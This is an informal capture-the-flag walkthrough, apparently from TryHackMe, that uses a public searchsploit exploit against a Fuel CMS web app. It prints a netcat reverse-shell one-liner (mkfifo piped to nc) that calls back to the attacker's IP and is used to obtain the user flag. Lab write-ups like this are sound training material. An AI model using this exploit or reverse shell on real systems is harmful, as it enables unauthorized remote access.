so there is an exploit available 

â”€â”€(rootðŸ’€kali)-[~/Desktop/THM]
â””â”€# searchsploit fuel 


â”Œâ”€â”€(rootðŸ’€kali)-[~/Desktop/THM]
â””â”€# searchsploit -m linux/webapps/47138.py   


got it in my local system made some changes to it

change the url to my machine Ip
url = "http://10.10.230.180"


and removed the `proxies=proxy` from the following line. T

his would be fine if you wanted to funnel this exploit through burp, but itâ€™s not necessary sicne we are not using it


tried to run the exploit using python3 but got an error
â”Œâ”€â”€(rootðŸ’€kali)-[~/Desktop/THM]
â””â”€# python3 47138.py           
  File "/root/Desktop/THM/47138.py", line 33
    print r.text[0:dup]
    ^^^^^^^^^^^^^^^^^^^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?


so did the same but with python2 and got a cmd shell

so i after this we can try to get a php reverse shell and it fails so i folled e the writeup

used this command:

â”Œâ”€â”€(rootðŸ’€kali)-[~/Desktop/THM]
â””â”€# python2 47138.py                                                                                                                                     1 â¨¯
cmd:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.20.174 8080 >/tmp/f 


opened a netcat listener on port 8080 and got a bash shell and from there i got the user flag
